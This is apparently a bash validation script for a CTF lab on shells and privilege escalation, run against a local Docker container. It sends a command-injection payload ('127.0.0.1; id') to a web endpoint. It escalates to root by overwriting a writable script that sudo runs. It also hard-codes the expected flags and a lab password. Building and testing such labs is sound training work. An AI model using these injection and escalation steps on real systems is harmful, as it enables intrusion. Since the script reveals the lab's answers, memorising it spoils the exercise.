#!/usr/bin/env bash
# Cycle-5 CTF — examiner dry-run for shells / PrivEsc (`ctf/shells-privesc`).
#
# Expects:
#   docker compose -f infra/docker-compose.prod.yml -f infra/docker-compose.ctf-shells.yml up -d --build
#
# Checks: prod clean · lab-host up · kc-agent health + RCE as lab · user.txt ·
#         sudo writable backup → root.txt · decoys non-exploitable under scripted checks.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
COMPOSE=(docker compose -f "${ROOT}/infra/docker-compose.prod.yml" -f "${ROOT}/infra/docker-compose.ctf-shells.yml")
EXPECTED_USER='OS{6bf28216861b0959811b7d2f3a68a4b7}'
EXPECTED_ROOT='OS{899a8fea5da7a28868f1eea9a9065592}'
LAB_PASS='4r98esfeb7'
BACKUP_ORIG="${ROOT}/infra/lab-host/ops/backup.sh"

chmod +x "${ROOT}/infra/assert-ssh-unpublished.sh" "${ROOT}/infra/assert-pg-unpublished.sh" 2>/dev/null || true
"${ROOT}/infra/assert-pg-unpublished.sh"
"${ROOT}/infra/assert-ssh-unpublished.sh"

echo "== lab-host service =="
"${COMPOSE[@]}" ps lab-host >/dev/null
cid="$("${COMPOSE[@]}" ps -q lab-host)"
if [[ -z "$cid" ]]; then
  echo "FAIL: lab-host container not running (start with prod + ctf-shells overlay)" >&2
  exit 1
fi
echo "OK: lab-host up ($cid)"

echo "== kc-agent /health =="
health="$(curl -fsS --max-time 5 http://127.0.0.1:8787/health)"
echo "$health" | grep -q '"service": "kc-agent"' || {
  echo "FAIL: /health unexpected: $health" >&2
  exit 1
}
echo "OK: kc-agent healthy"

echo "== kc-agent RCE as lab =="
resp="$(curl -fsS --max-time 10 --get --data-urlencode 'host=127.0.0.1; id' \
  'http://127.0.0.1:8787/check')"
echo "$resp" | grep -q '(lab)' || {
  echo "FAIL: RCE did not run as lab: $resp" >&2
  exit 1
}
echo "OK: command injection as lab"

echo "== user.txt =="
got_user="$(docker exec "$cid" cat /var/opt/kc/user.txt | tr -d '\r\n')"
if [[ "$got_user" != "$EXPECTED_USER" ]]; then
  echo "FAIL: user.txt mismatch: got='$got_user'" >&2
  exit 1
fi
echo "OK: user.txt"

echo "== sudoers + writable backup =="
sudo_l="$(docker exec -u lab "$cid" sudo -n -l)"
echo "$sudo_l" | grep -q '/opt/kc-ops/backup.sh' || {
  echo "FAIL: sudo -l missing backup.sh" >&2
  exit 1
}
docker exec -u lab "$cid" test -w /opt/kc-ops/backup.sh || {
  echo "FAIL: backup.sh not writable by lab" >&2
  exit 1
}
echo "OK: NOPASSWD backup.sh writable"

echo "== PrivEsc → root.txt =="
docker exec -u lab "$cid" sh -c 'printf "%s\n" "#!/bin/bash" "cat /root/root.txt" > /opt/kc-ops/backup.sh'
got_root="$(docker exec -u lab "$cid" sudo -n /opt/kc-ops/backup.sh | tr -d '\r\n')"
if [[ "$got_root" != "$EXPECTED_ROOT" ]]; then
  echo "FAIL: root.txt via sudo mismatch: got='$got_root'" >&2
  docker cp "${BACKUP_ORIG}" "${cid}:/opt/kc-ops/backup.sh" >/dev/null 2>&1 || true
  docker exec "$cid" chown lab:lab /opt/kc-ops/backup.sh
  docker exec "$cid" chmod 775 /opt/kc-ops/backup.sh
  exit 1
fi
# restore plant
docker cp "${BACKUP_ORIG}" "${cid}:/opt/kc-ops/backup.sh"
docker exec "$cid" chown lab:lab /opt/kc-ops/backup.sh
docker exec "$cid" chmod 775 /opt/kc-ops/backup.sh
echo "OK: root.txt via writable sudo script (restored)"

echo "== decoys =="
docker exec -u lab "$cid" sh -c 'test ! -w /opt/kc-ops/cleanup.sh'
docker exec "$cid" grep -q '/opt/kc-ops/cleanup.sh' /etc/crontabs/root
ver="$(docker exec "$cid" /usr/local/bin/kc-version | tr -d '\r\n')"
echo "$ver" | grep -q 'kc-version' || {
  echo "FAIL: kc-version unexpected: $ver" >&2
  exit 1
}
mode="$(docker exec "$cid" stat -c '%a' /usr/local/bin/kc-version)"
if [[ "$mode" != "4755" ]]; then
  echo "FAIL: kc-version mode expected 4755 got '$mode'" >&2
  exit 1
fi
echo "OK: cron + SUID decoys present / non-writable cleanup"

echo "== SSH password smoke (optional) =="
if command -v sshpass >/dev/null 2>&1 && command -v ssh >/dev/null 2>&1; then
  out="$(sshpass -p "${LAB_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p 2222 lab@127.0.0.1 'cat /var/opt/kc/user.txt' 2>/dev/null | tr -d '\r\n')"
  if [[ "$out" != "$EXPECTED_USER" ]]; then
    echo "FAIL: ssh login smoke got '$out'" >&2
    exit 1
  fi
  echo "OK: ssh password login on :2222"
else
  echo "SKIP: sshpass/ssh not installed — docker exec checks only"
fi

echo "PASS: cycle-5 shells examiner dry-run"
